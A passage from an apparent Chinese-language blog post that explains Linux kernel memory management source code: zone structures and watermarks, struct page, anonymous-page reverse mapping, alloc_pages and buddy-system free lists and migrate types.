class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _watermark[NR_WMARK];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> watermark_boost;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_reserved_highatomic;<br><br><span class="hljs-type">long</span> lowmem_reserve[MAX_NR_ZONES];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span>*<span class="hljs-title">zone_pgdat</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pageset</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">pageset</span>;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>zone_start_pfn;<br><br><span class="hljs-type">atomic_long_t</span>managed_pages;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>spanned_pages;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>present_pages;<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><br>ZONE_PADDING(_pad1_)<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span><span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br><br><span class="hljs-type">spinlock_t</span>lock;<br><br>ZONE_PADDING(_pad3_)<br><span class="hljs-type">atomic_long_t</span>vm_stat[NR_VM_ZONE_STAT_ITEMS];<br>&#125; ____cacheline_internodealigned_in_smp;<br></code></pre></td></tr></table></figure><ul><li><p>lock：防止并发访问</p></li><li><p>name：内存区域名称，Normal &#x2F; DMA &#x2F; HighMem</p></li><li><p>zone_pgdat：指向所属的NUMA节点</p></li><li><p>zone_start_pfn：属于该zone中的第一个物理页PFN</p></li><li><p>spanned_pages：zone中所有物理页个数（包括空洞）</p></li><li><p>present_pages：zone中可用物理页个数（不包括空洞）</p></li><li><p>managed_pages：buddy system管理的物理页个数</p></li><li><p>free_area：buddy system的核心数据结构</p></li><li><p>vm_stat：该zone使用的统计信息</p></li><li><p>nr_reserved_highatomic：该zone预留内存的大小[128KB, 65536KB]</p></li><li><p>lowmem_reserve：规定每个内存区域必须为自己保留的物理页数量，防止更高位的内存区域对自己的内存空间进行过多的侵占挤压</p></li><li><p>_watermark：物理内存区域中的水位线</p><ul><li>物理内存剩余容量大于_watermark[WMARK_HIGH] → 内存充足，分配无压力</li><li>大于_watermark[WMARK_LOW]，小于_watermark[WMARK_HIGH] → 分配有压力但可接受</li><li>大于_watermark[WMARK_MIN]，小于_watermark[WMARK_LOW] → 唤醒kswapd进程开始异步回收</li><li>小于_watermark[WMARK_MIN] → 阻塞请求分配的进程，唤醒kswapd进程进行回收，回收完毕唤醒阻塞的进程</li></ul></li><li><p>watermark_boost：优化内存碎片对内存分配的影响，可以动态改变内存区域的基准水位线</p></li><li><p>pageset：per_cpu_pageset，管理冷热页（__percpu变量）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pageset</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> <span class="hljs-title">pcp</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>用一个双向列表管理per_cpu_pages，热页在前，冷页在后</p><p>per_cpu_pages结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> &#123;</span><br><span class="hljs-type">int</span> count;<span class="hljs-comment">/* number of pages in the list */</span><br><span class="hljs-type">int</span> high;<span class="hljs-comment">/* high watermark, emptying needed */</span><br><span class="hljs-type">int</span> batch;<span class="hljs-comment">/* chunk size for buddy add/remove */</span><br><br><span class="hljs-comment">/* Lists of pages, one per migrate type stored on the pcp-lists */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lists</span>[<span class="hljs-title">MIGRATE_PCPTYPES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>lists：双向列表</li><li>count：物理页数量</li><li>high：count超过了high，那么表示list中的页面太多了，内核会从高速缓存中释放batch个页面到物理内存区域中的伙伴系统中</li><li>batch：见上</li></ul></li></ul><h2 id="物理内存页描述"><a href="#物理内存页描述" class="headerlink" title="物理内存页描述"></a>物理内存页描述</h2><p>page结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-comment">// 存储 page 的定位信息以及相关标志位</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;        <br><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* Page cache and anonymous pages */</span><br>            <span class="hljs-comment">// 用来指向物理页 page 被放置在了哪个 lru 链表上</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lru</span>;</span><br>            <span class="hljs-comment">// 如果 page 为文件页的话，低位为0，指向 page 所在的 page cache</span><br>            <span class="hljs-comment">// 如果 page 为匿名页的话，低位为1，指向其对应虚拟地址空间的匿名映射区 anon_vma</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span>;</span><br>            <span class="hljs-comment">// 如果 page 为文件页的话，index 为 page 在 page cache 中的索引</span><br>            <span class="hljs-comment">// 如果 page 为匿名页的话，表示匿名页在对应进程虚拟内存区域 VMA 中的偏移</span><br>            <span class="hljs-type">pgoff_t</span> index;<br>            <span class="hljs-comment">// 在不同场景下，private 指向的场景信息不同</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>        &#125;;<br>        <br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* slab, slob and slub */</span><br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-comment">// 用于指定当前 page 位于 slab 中的哪个具体管理链表上。</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>                    <span class="hljs-comment">// 当 page 位于 slab 结构中的某个管理链表上时，next 指针用于指向链表中的下一个 page</span><br>                    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br>                    <span class="hljs-comment">// 表示 slab 中总共拥有的 page 个数</span><br>                    <span class="hljs-type">int</span> pages;  <br>                    <span class="hljs-comment">// 表示 slab 中拥有的特定类型的对象个数</span><br>                    <span class="hljs-type">int</span> pobjects;   <br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>                    <span class="hljs-type">short</span> <span class="hljs-type">int</span> pages;<br>                    <span class="hljs-type">short</span> <span class="hljs-type">int</span> pobjects;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                &#125;;<br>            &#125;;<br>            <span class="hljs-comment">// 用于指向当前 page 所属的 slab 管理结构</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span> <br>        <br>            <span class="hljs-comment">// 指向 page 中的第一个未分配出去的空闲对象</span><br>            <span class="hljs-type">void</span> *freelist;     <br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-comment">// 指向 page 中的第一个对象</span><br>                <span class="hljs-type">void</span> *s_mem;    <br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>            <span class="hljs-comment">/* SLUB */</span><br>                    <span class="hljs-comment">// 表示 slab 中已经被分配出去的对象个数</span><br>                    <span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br>                    <span class="hljs-comment">// slab 中所有的对象个数</span><br>                    <span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br>                    <span class="hljs-comment">// 当前内存页 page 被 slab 放置在 CPU 本地缓存列表中，frozen = 1，否则 frozen = 0</span><br>                    <span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>                &#125;;<br>            &#125;;<br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* 复合页 compound page 相关*/</span><br>            <span class="hljs-comment">// 复合页的尾页指向首页</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> compound_head;    <br>            <span class="hljs-comment">// 用于释放复合页的析构函数，保存在首页中</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> compound_dtor;<br>            <span class="hljs-comment">// 该复合页有多少个 page 组成</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> compound_order;<br>            <span class="hljs-comment">// 该复合页被多少个进程使用，内存页反向映射的概念，首页中保存</span><br>            <span class="hljs-type">atomic_t</span> compound_mapcount;<br>        &#125;;<br><br>        <span class="hljs-comment">// 表示 slab 中需要释放回收的对象链表</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>    &#125;;<br><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>     <span class="hljs-comment">/* This union is 4 bytes in size. */</span><br>        <span class="hljs-comment">// 表示该 page 映射了多少个进程的虚拟内存空间，一个 page 可以被多个进程映射</span><br>        <span class="hljs-type">atomic_t</span> _mapcount;<br><br>    &#125;;<br><br>    <span class="hljs-comment">// 内核中引用该物理页的次数，表示该物理页的活跃程度。</span><br>    <span class="hljs-type">atomic_t</span> _refcount;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span><br>    <span class="hljs-type">void</span> *virtual;  <span class="hljs-comment">// 内存页对应的虚拟内存地址</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* WANT_PAGE_VIRTUAL */</span></span><br><br>&#125; _struct_page_alignment;<br></code></pre></td></tr></table></figure><ul><li><p>mapping：page cache（高速页缓存）结构体address_space，被文件的inode持有</p><ul><li>page为文件页：mapping最低位为0，指向页关联文件的address_space</li><li>page为匿名页：mapping最低位为1，指向匿名页在进程虚拟内存空间中的匿名映射区域anon_vma结构，用于物理内存到虚拟内存的反向映射</li></ul></li><li><p>index：pgoff_t</p><ul><li>page为文件页：表示该内存页中的文件数据在文件内部的偏移offset，偏移单位为页大小</li><li>page为匿名页：表示匿名页在对应进程虚拟内存区域VMA中的偏移</li></ul></li><li><p>_mapcount：表示该page映射了多少个进程的虚拟内存空间，一个page可以被多个进程映射</p></li><li><p>lru：指向物理页被放置在了哪个链表上（active，inactive）</p></li><li><p>_refcount：用来记录内核中引用该物理页的次数，表示该物理页的活跃程度</p></li><li><p>flags：</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/flags.png" class title="flags"><ul><li>高8位储存定位信息（section，zone，node）</li><li>储存访问相关，换入换出相关等标志</li></ul></li><li><p>复合页相关</p><ul><li>flags：如果是首页会设置PG_head</li><li>compound_head：复合页的尾页用来指向首页</li><li>compound_dtor：用于释放复合页的析构函数</li><li>compound_order：复合页的order</li><li>compound_mapcount：使用复合页的进程个数，内存页反向映射的概念，首页中保存</li><li>compound_pincount：复合页使用计数，首页中保存</li></ul></li></ul><h3 id="匿名页的反向映射"><a href="#匿名页的反向映射" class="headerlink" title="匿名页的反向映射"></a>匿名页的反向映射</h3><p>在物理页需要被迁移或者回收时使用，此时需要找到物理页映射的虚拟地址，并断开连接</p><ul><li><p>page：结构体表示一个物理页</p></li><li><p>anon_vma：表示一个匿名页（仅用于反向映射）</p></li><li><p>anon_vma_chain：表示一个匿名页和一段虚拟内存的关系</p><p><strong>匿名页和虚拟内存是一对多的关系，因为一个匿名页可能映射到很多进程的虚拟空间 → anon_vma和anon_vma_chain也是一对多的关系</strong></p></li><li><p>vm_area_struct：表示一段虚拟内存</p></li></ul><ul><li><p>page中的mapping指向anon_vma结构体</p></li><li><p>anon_vma结构体中的rb_root红黑树储存了所有与匿名页相关的anon_vma_chain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* Root of this anon_vma tree */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">rwsem</span>;</span><span class="hljs-comment">/* W: modification, R: walking the list */</span><br><span class="hljs-type">atomic_t</span> refcount;<br><span class="hljs-type">unsigned</span> degree;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">parent</span>;</span><span class="hljs-comment">/* Parent of this anon_vma */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_root_cached</span> <span class="hljs-title">rb_root</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>anon_vma_chain结构体串联vm_area_struct和anon_vma</p><ul><li>vma指向相关的vm_area_struct</li><li>anon_vma指向相关的虚拟页</li><li>same_vma双向链表串联了vma的所有匿名页</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma_chain</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">anon_vma</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">same_vma</span>;</span>   <span class="hljs-comment">/* locked by mmap_lock &amp; page_table_lock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_node</span> <span class="hljs-title">rb</span>;</span><span class="hljs-comment">/* locked by anon_vma-&gt;rwsem */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rb_subtree_last;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_VM_RB</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cached_vma_start, cached_vma_last;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>vm_area_struct表示VMA</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">anon_vma_chain</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">anon_vma</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>anon_vma_chain双向链表串连了VMA的所有匿名页</li><li>anon_vma用于快速判断 VMA 有没有对应的匿名 page</li></ul></li></ul><h1 id="物理内存分配"><a href="#物理内存分配" class="headerlink" title="物理内存分配"></a>物理内存分配</h1><h2 id="物理内存分配接口"><a href="#物理内存分配接口" class="headerlink" title="物理内存分配接口"></a>物理内存分配接口</h2><p>alloc_pages函数用于请求2的order次幂个page</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">alloc_pages</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order)</span>;<br></code></pre></td></tr></table></figure><ul><li>order：分配阶</li><li>gfp：用于规范物理内存分配行为的修饰符</li></ul><p>返回的是page结构体，需要转换成虚拟地址使用，__get_free_pages函数可以返回虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __get_free_pages(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br>page = alloc_pages(gfp_mask &amp; ~__GFP_HIGHMEM, order);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page_address(page);<br>&#125;<br>EXPORT_SYMBOL(__get_free_pages);<br></code></pre></td></tr></table></figure><p>内部也是调用了alloc_pages，进行了地址转换</p><ul><li>不能分配高端内存，高端内存不适用于直接地址转换</li><li>返回地址位于直接映射区</li></ul><p>get_zeroed_page会把page内容清零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">get_zeroed_page</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask)</span><br>&#123;<br><span class="hljs-keyword">return</span> __get_free_pages(gfp_mask | __GFP_ZERO, <span class="hljs-number">0</span>);<br>&#125;<br>EXPORT_SYMBOL(get_zeroed_page);<br></code></pre></td></tr></table></figure><p>__get_dma_pages只分配DMA内存页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __get_dma_pages(gfp_mask, order) \</span><br><span class="hljs-meta">__get_free_pages((gfp_mask) | GFP_DMA, (order))</span><br></code></pre></td></tr></table></figure><p>两个内存释放函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __free_pages(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order);<br><span class="hljs-type">void</span> <span class="hljs-title function_">free_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order)</span>;<br></code></pre></td></tr></table></figure><ul><li>__free_pages对应alloc_pages，使用page结构体</li><li>free_pages对应__get_free_pages，使用虚拟内存地址</li></ul><h2 id="物理内存分配源码实现"><a href="#物理内存分配源码实现" class="headerlink" title="物理内存分配源码实现"></a>物理内存分配源码实现</h2><p>大佬写的很详细了所以就放两张图doge</p><p>函数调用图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/allocpages.png" class title="allocpages"><p>__alloc_pages函数的逻辑</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/wateralloc.png" class title="wateralloc"><h1 id="buddy-system"><a href="#buddy-system" class="headerlink" title="buddy system"></a>buddy system</h1><p>zone中buddy system相关成员</p><p>free_area的下标表示order</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">// 被伙伴系统所管理的物理内存页个数（present_pages-reserved_pages）</span><br>    <span class="hljs-type">atomic_long_t</span>       managed_pages;<br>    <span class="hljs-comment">// 伙伴系统的核心数据结构</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span>    <span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>&#125;<br></code></pre></td></tr></table></figure><p>free_area，不同迁移类型的page用不同的链表管理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">free_list</span>[<span class="hljs-title">MIGRATE_TYPES</span>];</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>nr_free;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>迁移类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migratetype</span> &#123;</span><br>MIGRATE_UNMOVABLE,<span class="hljs-comment">// 不可迁移</span><br>MIGRATE_MOVABLE,<span class="hljs-comment">// 可迁移</span><br>MIGRATE_RECLAIMABLE,<span class="hljs-comment">// 可回收</span><br>MIGRATE_PCPTYPES,<span class="hljs-comment">// 属于高速缓存（per_cpu_pageset）</span><br>MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,  <span class="hljs-comment">// 紧急内存</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CMA</span><br>MIGRATE_CMA,<span class="hljs-comment">// 预留的连续内存CMA</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span><br>MIGRATE_ISOLATE,<span class="hljs-comment">// can&#x27;t allocate from here</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>MIGRATE_TYPES<span class="hljs-comment">// 迁移类型数量</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>UNMOVABLE：一般位于直接映射区，内核所需要的核心内存一般从这分配</li><li>MOVABLE：一般用于在进程用户空间中分配，因为在用户空间中虚拟内存与物理内存都是通过页表来动态映射的，物理页移动之后，只需要改变页表中的映射关系即可，而虚拟内存地址并不需要改变</li><li>PCPTYPES：里面包含了高速缓存中的冷页和热页</li><li>RECLAIMABLE：不能移动但可以回收，比如文件缓存页，之后再从文件中读取就行</li><li>CMA：contiguous memory allocator，是一个分配连续物理内存页面的分配器，用于分配连续的物理内存</li><li>ISOLATE：一个虚拟区域，用于跨越NUMA节点移动物理内存页，内核可以将物理内存页移动到使用该页最频繁的CPU 所在的NUMA节点中</li></ul><p>长这样</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/buddy.png" class title="buddy"><p>如果对应order，migratetype的page不够，从其他migratetype中申请的顺序，注意fallbacks分配的顺序和正常分配的顺序是反的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> fallbacks[MIGRATE_TYPES][<span class="hljs-number">3</span>] = &#123;<br>[MIGRATE_UNMOVABLE]   = &#123; MIGRATE_RECLAIMABLE, MIGRATE_MOVABLE,   MIGRATE_TYPES &#125;,<br>[MIGRATE_MOVABLE]     = &#123; MIGRATE_RECLAIMABLE, MIGRATE_UNMOVABLE, MIGRATE_TYPES &#125;,<br>[MIGRATE_RECLAIMABLE] = &#123; MIGRATE_UNMOVABLE,   MIGRATE_MOVABLE,   MIGRATE_TYPES &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>放一张get_page_from_freelist函数的逻辑</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/freelist.png" class title="freelist"><ul><li>for_next_zone_zonelist_nodemask遍历<strong>当前NUMA节点以及备用节点的所有zone（zonelist）</strong></li><li>zone_watermark_fast检查zone中的剩余内存是否在指定水位线上，是则跳转至try_this_zone调用rmqueue进入buddy system进行内存分配，分配成功后调用prep_new_page初始化分配好的page，否则继续</li><li>node_reclaim触发内存回收，回收后通过zone_watermark_ok检查回收的内存是否满足本次分配需要，是则跳转至try_this_zone在zone中分配内存</li></ul><p>rmqueue包括了buddy system的主逻辑</p><ul><li>__rmqueue_smallest封装buddy system的核心流程</li><li>__rmqueue底层调用__rmqueue_smallest，还包括fallback的过程</li></ul><p>一次分配的流程图</p><img 